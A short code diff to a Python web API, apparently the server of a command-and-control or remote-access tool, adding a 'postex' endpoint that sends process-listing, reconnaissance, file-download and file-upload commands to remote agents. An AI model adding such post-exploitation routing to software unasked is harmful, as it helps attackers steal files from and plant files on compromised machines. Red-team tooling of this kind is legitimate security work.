@@ -206,6 +206,29 @@ async def kill_agent(agent_id: str):
     return {"status": "ok", "message": result}
 
 
+class PostexRequest(BaseModel):
+    op: str
+    path: str = ""
+    data: str = ""
+
+
+@router.post("/agents/{agent_id}/postex")
+async def postex(agent_id: str, req: PostexRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    op = (req.op or "").strip()
+    if op not in ("ps", "recon", "download", "upload"):
+        raise HTTPException(400, "Unknown postex op")
+    if op == "download":
+        command = "__px:download:" + req.path
+    elif op == "upload":
+        command = "__px:upload:" + req.path + ":" + req.data
+    else:
+        command = "__px:" + op
+    result = await _server.send_command_to_agent(agent_id, command)
+    return {"output": result}
+
+
 @router.post("/agents/{agent_id}/desktop")
 async def desktop(agent_id: str, req: CommandRequest):
     if not _server or agent_id not in _server.agents:
